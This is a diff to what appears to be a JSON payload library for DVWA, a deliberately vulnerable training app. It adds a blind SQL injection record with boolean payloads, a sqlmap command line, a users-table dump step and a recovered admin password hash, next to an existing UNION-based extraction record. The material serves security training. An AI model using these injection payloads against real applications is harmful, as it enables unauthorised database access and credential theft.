@@ -5,5 +5,13 @@
     "reference_payload": "POST /vulnerabilities/sqli/ body: id=1 UNION SELECT user,password FROM users&Submit=Submit  ;  指纹: id=1 UNION SELECT version(),database()&Submit=Submit",
     "principle": "数字型注入无引号闭合 → UNION 列数对齐拖库；版本/库名指纹 version(),database()",
     "source": "dvwa"
+  },
+  {
+    "id": "auto-20261030130738",
+    "context": "DVWA medium SQL Injection (Blind)。POST 参数 id 直接拼接进 \"SELECT ... WHERE user_id = $id\"（数字型无引号，mysqli_real_escape_string 只转义引号不影响）。页面不回显数据，只返回 \"User ID exists in the database.\" / 不存在，按布尔真假盲注。需登录会话(PHPSESSID)方可请求。",
+    "reference_payload": "id=1 AND 1=1  (真→exists) / id=1 AND 1=2 (假→不存在)；sqlmap: --data=\"id=1&Submit=Submit\" --technique=B --string=\"User ID exists in the database.\"",
+    "principle": "数字型注入无引号闭合；布尔盲注以 \"User ID exists\" 字符串作真假基准逐字符拖数据，最终 -D dvwa -T users --dump 拖出 admin:5f4dcc3b5aa765d61d8327deb882cf99",
+    "source": "dvwa",
+    "verify_url": "http://localhost:8081/vulnerabilities/sqli_blind/ (POST id={payload})"
   }
 ]
